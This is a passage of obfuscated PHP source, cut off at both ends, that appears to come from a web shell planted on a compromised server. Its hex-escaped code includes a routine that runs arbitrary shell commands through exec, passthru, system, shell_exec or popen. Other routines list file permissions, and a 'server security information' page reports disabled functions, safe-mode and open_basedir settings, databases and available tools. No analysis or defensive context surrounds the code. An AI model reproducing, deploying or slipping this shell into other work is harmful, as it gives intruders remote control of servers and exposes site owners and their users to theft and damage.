vooxifxi="\x6f\x75t";${"G\x4c\x4f\x42\x41L\x53"}["\x6c\x62\x6c\x67dc\x67\x65yp\x73"]="\x6f\x75\x74";@exec(${${"G\x4c\x4f\x42A\x4c\x53"}["\x63fh\x6bg\x78\x6f\x79\x79u"]},${${"G\x4cO\x42A\x4c\x53"}["\x6c\x62l\x67dc\x67\x65\x79ps"]});${$ttvooxifxi}=@join("\n",${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x70b\x70\x64\x68\x77"]});}elseif(function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")){ob_start();${"G\x4cOBA\x4c\x53"}["\x77peo\x61q\x77\x6f\x63u\x62"]="\x69\x6e";@passthru(${${"GL\x4f\x42\x41L\x53"}["wp\x65\x6f\x61q\x77\x6fcu\x62"]});$xejqfzwnl="o\x75t";${$xejqfzwnl}=ob_get_clean();}elseif(function_exists("\x73y\x73t\x65\x6d")){ob_start();${"G\x4cOB\x41\x4cS"}["\x69\x74\x78v\x6e\x6a"]="\x6fut";@system(${${"\x47LO\x42\x41\x4c\x53"}["c\x66\x68\x6b\x67xo\x79\x79u"]});${${"\x47\x4cO\x42A\x4cS"}["\x69\x74x\x76\x6e\x6a"]}=ob_get_clean();}elseif(function_exists("shell_\x65\x78\x65\x63")){$vtbqfxfckf="i\x6e";$fjdjqmjs="\x6f\x75\x74";${$fjdjqmjs}=shell_exec(${$vtbqfxfckf});}elseif(is_resource(${${"\x47LO\x42\x41L\x53"}["\x65d\x6a\x73\x68\x69\x75"]}=@popen(${${"\x47\x4cO\x42\x41\x4c\x53"}["\x63fhkg\x78\x6f\x79\x79\x75"]},"r"))){$eibakuhym="o\x75\x74";$shghnom="f";${"\x47LO\x42\x41\x4c\x53"}["\x64\x77\x72\x73k\x68\x6c\x77"]="\x66";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["b\x77\x69\x72\x72\x6f\x6a\x71z\x77\x75\x76"]="\x66";${$eibakuhym}="";while(!@feof(${${"\x47L\x4f\x42AL\x53"}["b\x77i\x72\x72o\x6aq\x7a\x77uv"]}))${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x70b\x70d\x68\x77"]}.=fread(${$shghnom},1024);pclose(${${"\x47\x4c\x4f\x42\x41\x4cS"}["dw\x72\x73\x6b\x68\x6c\x77"]});}return${${"GL\x4f\x42\x41L\x53"}["p\x62p\x64h\x77"]};}function viewSize($s){${"\x47LO\x42\x41L\x53"}["\x79\x62q\x78\x6f\x70\x6bv\x67"]="\x73";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x66\x72\x63\x63\x62\x6c\x63\x6d"]="\x73";${"G\x4c\x4f\x42\x41\x4c\x53"}["im\x77\x78\x69\x69\x6f"]="s";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["k\x75b\x6a\x71f\x79"]="\x73";if(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6bu\x62\x6a\x71\x66y"]}>=1073741824)return sprintf("%\x31\x2e\x32f",${${"\x47L\x4f\x42A\x4c\x53"}["\x79\x62q\x78\x6f\x70k\x76g"]}/1073741824)." GB";elseif(${${"\x47L\x4f\x42A\x4c\x53"}["\x66r\x63\x63\x62\x6c\x63\x6d"]}>=1048576)return sprintf("\x251\x2e\x32f",${${"\x47\x4c\x4fB\x41\x4c\x53"}["b\x71\x66\x74\x6b\x78\x63\x6c\x64z\x64"]}/1048576)."\x20\x4d\x42";elseif(${${"\x47L\x4fB\x41\x4cS"}["\x62q\x66\x74\x6bxc\x6c\x64z\x64"]}>=1024)return sprintf("%1\x2e\x32\x66",${${"GL\x4f\x42A\x4c\x53"}["i\x6d\x77\x78i\x69\x6f"]}/1024)." \x4bB";else return${${"\x47L\x4fB\x41\x4cS"}["b\x71\x66t\x6bxc\x6c\x64\x7a\x64"]}." \x42";}function perms($p){$gwqjtvxpi="\x70";${"GLOB\x41\x4cS"}["\x73\x74r\x67\x6epd\x68\x77\x69\x72"]="\x70";${"\x47\x4c\x4fBA\x4c\x53"}["j\x73x\x69rk\x6div\x68d"]="i";$grvvhwcsff="\x70";$sntrdlds="\x69";${"\x47\x4c\x4fB\x41\x4cS"}["\x78\x79\x6c\x64\x6e\x6e\x6e\x66\x71y\x75\x6a"]="p";${"\x47\x4c\x4f\x42A\x4c\x53"}["d\x69i\x67o\x67\x64"]="\x70";${"\x47L\x4f\x42\x41\x4c\x53"}["\x6b\x74\x71\x61\x73l\x63"]="\x69";$ryfoomlhpkit="i";$vemiccj="\x69";$jbcbgmg="\x70";$fojfhhs="\x70";$utqneysucdu="\x70";$ntwdhykhkkk="\x69";${"G\x4c\x4f\x42\x41L\x53"}["\x76\x68j\x70l\x6a\x67\x71\x76"]="p";if((${${"\x47L\x4f\x42\x41\x4c\x53"}["\x78\x79\x6c\x64nn\x6ef\x71\x79\x75\x6a"]}&0xC000)==0xC000)${$sntrdlds}="s";elseif((${${"GL\x4fBA\x4cS"}["\x6a\x68\x79cu\x74\x73"]}&0xA000)==0xA000)${$ryfoomlhpkit}="\x6c";elseif((${$jbcbgmg}&0x8000)==0x8000)${$vemiccj}="-";elseif((${${"\x47\x4cO\x42\x41\x4c\x53"}["jh\x79\x63\x75\x74s"]}&0x6000)==0x6000)${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x6b\x74\x71\x61\x73\x6c\x63"]}="\x62";elseif((${${"G\x4cO\x42\x41\x4c\x53"}["\x6a\x68\x79\x63ut\x73"]}&0x4000)==0x4000)${${"G\x4c\x4f\x42A\x4c\x53"}["\x69wg\x76\x73q\x63\x77\x72\x6a\x79"]}="\x64";elseif((${${"\x47L\x4fB\x41\x4cS"}["s\x74\x72g\x6ep\x64h\x77\x69\x72"]}&0x2000)==0x2000)${${"G\x4c\x4fBAL\x53"}["i\x77\x67vs\x71\x63w\x72\x6ay"]}="c";elseif((${$fojfhhs}&0x1000)==0x1000)${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x69\x77\x67v\x73\x71\x63\x77\x72jy"]}="p";else${${"\x47L\x4f\x42A\x4c\x53"}["\x69w\x67v\x73\x71\x63\x77\x72\x6ay"]}="u";$hologdkzhp="\x69";${${"\x47\x4c\x4fB\x41L\x53"}["i\x77\x67\x76\x73qcwrj\x79"]}.=((${${"GL\x4fBAL\x53"}["\x64\x69i\x67\x6f\x67\x64"]}&0x0100)?"\x72":"-");$sdrymi="p";${${"G\x4cO\x42\x41LS"}["\x69w\x67\x76sqc\x77\x72\x6a\x79"]}.=((${${"\x47\x4c\x4fB\x41L\x53"}["j\x68\x79\x63\x75\x74\x73"]}&0x0080)?"w":"-");$yshdoeoh="\x69";${$ntwdhykhkkk}.=((${${"G\x4cOB\x41L\x53"}["\x6ah\x79cu\x74\x73"]}&0x0040)?((${${"\x47\x4cOB\x41LS"}["jh\x79\x63u\x74\x73"]}&0x0800)?"s":"\x78"):((${$utqneysucdu}&0x0800)?"S":"-"));$ivtcgexzll="\x70";${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x69w\x67\x76\x73\x71\x63\x77r\x6a\x79"]}.=((${$sdrymi}&0x0020)?"r":"-");${$hologdkzhp}.=((${$gwqjtvxpi}&0x0010)?"\x77":"-");${${"GL\x4f\x42A\x4c\x53"}["\x69w\x67v\x73\x71\x63\x77r\x6a\x79"]}.=((${${"\x47L\x4f\x42\x41\x4c\x53"}["j\x68\x79\x63\x75\x74\x73"]}&0x0008)?((${${"\x47LOB\x41\x4c\x53"}["j\x68y\x63\x75t\x73"]}&0x0400)?"\x73":"x"):((${${"G\x4c\x4f\x42AL\x53"}["jh\x79\x63\x75\x74\x73"]}&0x0400)?"\x53":"-"));${"\x47L\x4fBA\x4c\x53"}["xxx\x75b\x71u\x68i\x62"]="\x70";${${"\x47\x4c\x4fB\x41\x4c\x53"}["jsxi\x72\x6b\x6d\x69vh\x64"]}.=((${${"\x47\x4cO\x42\x41L\x53"}["\x6ahy\x63u\x74\x73"]}&0x0004)?"\x72":"-");${${"GL\x4fB\x41\x4c\x53"}["\x69wg\x76\x73\x71cw\x72\x6a\x79"]}.=((${$ivtcgexzll}&0x0002)?"\x77":"-");${$yshdoeoh}.=((${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x78\x78\x78\x75bq\x75hi\x62"]}&0x0001)?((${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x76h\x6a\x70\x6cjg\x71\x76"]}&0x0200)?"\x74":"\x78"):((${$grvvhwcsff}&0x0200)?"\x54":"-"));return${${"G\x4c\x4f\x42A\x4c\x53"}["\x69\x77\x67\x76s\x71\x63\x77\x72\x6a\x79"]};}function viewPermsColor($f){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["g\x73\x6al\x68lyqd\x74\x61"]="\x66";if(!@is_readable(${${"\x47\x4cO\x42\x41\x4c\x53"}["\x67s\x6a\x6c\x68\x6c\x79q\x64\x74\x61"]}))return"<fo\x6et c\x6f\x6cor\x3d\x23\x46F00\x30\x30><\x62>".perms(@fileperms(${${"G\x4cO\x42\x41\x4c\x53"}["e\x64\x6a\x73hi\x75"]}))."</b>\x3c/\x66\x6fnt>";elseif(!@is_writable(${${"G\x4cO\x42AL\x53"}["\x65\x64js\x68\x69\x75"]}))return"<font \x63o\x6c\x6fr\x3d\x77\x68ite\x3e<b\x3e".perms(@fileperms(${${"\x47\x4cO\x42\x41L\x53"}["\x65dj\x73\x68\x69u"]}))."</b>\x3c/fo\x6e\x74>";else return"<f\x6fnt\x20c\x6flor=#0\x30\x42\x42\x300\x3e\x3c\x62>".perms(@fileperms(${${"\x47\x4cO\x42ALS"}["\x65\x64j\x73\x68\x69\x75"]}))."\x3c/b\x3e</\x66\x6fnt>";}if(!function_exists("sc\x61\x6ed\x69r")){function scandir($dir){$fdyxqv="f\x69le\x73";${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x73\x6f\x71\x76\x71\x71\x67\x63\x61\x6b"]}=opendir(${${"\x47L\x4f\x42\x41L\x53"}["ywn\x75s\x63\x6e"]});while(false!==(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x75h\x6ec\x66\x78\x64\x71\x76"]}=readdir(${${"\x47L\x4f\x42\x41LS"}["\x73\x6f\x71v\x71qg\x63\x61\x6b"]}))){$aqnjducygr="\x66\x69\x6cen\x61\x6d\x65";$pbphvihwxkt="\x66i\x6c\x65\x73";${$pbphvihwxkt}[]=${$aqnjducygr};}return${$fdyxqv};}}function which($p){$plbojgjxokxv="\x70\x61t\x68";$nknjhpou="\x70\x61\x74h";${$plbojgjxokxv}=ex("\x77hi\x63h\x20".${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x6a\x68yc\x75ts"]});if(!empty(${${"GLO\x42\x41\x4c\x53"}["m\x65\x71\x6fg\x6c\x6fa\x76\x67g"]}))return${$nknjhpou};return false;}function actionSecInfo(){printHeader();echo"\x3c\x681\x3eSer\x76\x65\x72\x20s\x65\x63u\x72i\x74\x79\x20in\x66\x6fr\x6da\x74\x69\x6fn</\x68\x31\x3e\x3cd\x69\x76\x20c\x6c\x61s\x73\x3dcont\x65\x6e\x74>";function showSecParam($n,$v){$yppypltjnpug="\x76";$indxxknv="v";$lcxzouee="v";${$lcxzouee}=trim(${$yppypltjnpug});if(${$indxxknv}){echo"\x3cspan>".${${"GL\x4f\x42\x41LS"}["i\x6f\x78qp\x66t\x69"]}.": \x3c/\x73\x70a\x6e\x3e";if(strpos(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["d\x77\x77\x71\x77\x6f\x79\x69xqp"]},"\n")===false)echo${${"G\x4cO\x42\x41\x4cS"}["\x64w\x77\x71\x77\x6f\x79\x69xq\x70"]}."<\x62\x72>";else echo"\x3cpre c\x6c\x61ss\x3d\x6d\x6c1\x3e".${${"GL\x4f\x42\x41\x4c\x53"}["d\x77w\x71\x77\x6f\x79\x69\x78\x71\x70"]}."</p\x72e>";}}showSecParam("\x53e\x72v\x65r sof\x74\x77\x61r\x65",@getenv("SE\x52VER\x5f\x53\x4fFTW\x41\x52E"));${"G\x4c\x4f\x42\x41L\x53"}["u\x79e\x71ms\x67"]="\x74\x65\x6d\x70";showSecParam("\x44\x69\x73abl\x65\x64\x20\x50\x48\x50\x20\x46\x75n\x63t\x69\x6f\x6e\x73",($GLOBALS["di\x73ab\x6c\x65\x5ff\x75nct\x69on\x73"])?$GLOBALS["\x64\x69sable_fu\x6ect\x69o\x6e\x73"]:"none");showSecParam("\x4fpe\x6e\x20\x62a\x73e dir",@ini_get("o\x70en_\x62as\x65\x64i\x72"));showSecParam("\x53\x61\x66e m\x6f\x64e\x20\x65\x78\x65c \x64\x69r",@ini_get("\x73af\x65_mo\x64\x65_exec_\x64\x69\x72"));${"GL\x4f\x42\x41L\x53"}["g\x68\x71\x68\x79\x74s"]="t\x65\x6d\x70";showSecParam("S\x61f\x65\x20mo\x64e\x20in\x63\x6cud\x65 \x64\x69\x72",@ini_get("\x73\x61fe\x5fmod\x65_inc\x6c\x75\x64e_\x64ir"));showSecParam("\x63UR\x4c sup\x70or\x74",function_exists("curl_ve\x72sion")?"\x65\x6e\x61\x62\x6ced":"\x6eo");${"\x47\x4cO\x42\x41L\x53"}["\x75b\x6abl\x70\x69p\x70\x74x"]="te\x6dp";${${"G\x4cO\x42\x41\x4c\x53"}["\x72l\x74\x6f\x6f\x6c\x68myq"]}=array();${"\x47\x4c\x4fB\x41LS"}["\x6b\x68\x63\x76\x64z\x69\x74\x72\x66\x65"]="\x74\x65\x6d\x70";if(function_exists("mys\x71l_\x67\x65\x74\x5f\x63\x6cie\x6e\x74_\x69\x6e\x66o"))${${"G\x4c\x4fB\x41\x4cS"}["\x6b\x68\x63\x76\x64\x7ait\x72\x66\x65"]}[]="\x4d\x79S\x71l\x20(".mysql_get_client_info().")";if(function_exists("\x6d\x73s\x71\x6c\x5fco\x6e\x6e\x65\x63\x74"))${${"\x47\x4c\x4fB\x41L\x53"}["u\x62\x6a\x62\x6cpi\x70\x70\x74\x78"]}[]="\x4d\x53S\x51L";if(function_exists("\x70g_co\x6ene\x63\x74"))${${"GL\x4fBA\x4cS"}["\x75ye\x71\x6ds\x67"]}[]="\x50os\x74\x67\x72\x65\x53\x51\x4c";if(function_exists("\x6f\x63\x69_c\x6fn\x6eect"))${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["r\x6c\x74\x6f\x6f\x6c\x68\x6dy\x71"]}[]="\x4fr\x61cle";showSecParam("\x53upp\x6fr\x74\x65d \x64ata\x62a\x73es",implode(", ",${${"\x47\x4c\x4fB\x41\x4c\x53"}["g\x68\x71\x68\x79t\x73"]}));echo"<br>";if($GLOBALS["o\x73"]=="\x6ei\x78"){${"\x47\x4c\x4f\x42\x41\x4cS"}["\x62\x79ru\x6d\x6e\x6c\x69n\x71e"]="use\x72\x66\x75l";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x68\x65\x74\x69ggt"]="\x64o\x77\x6el\x6fa\x64\x65r\x73";${${"GL\x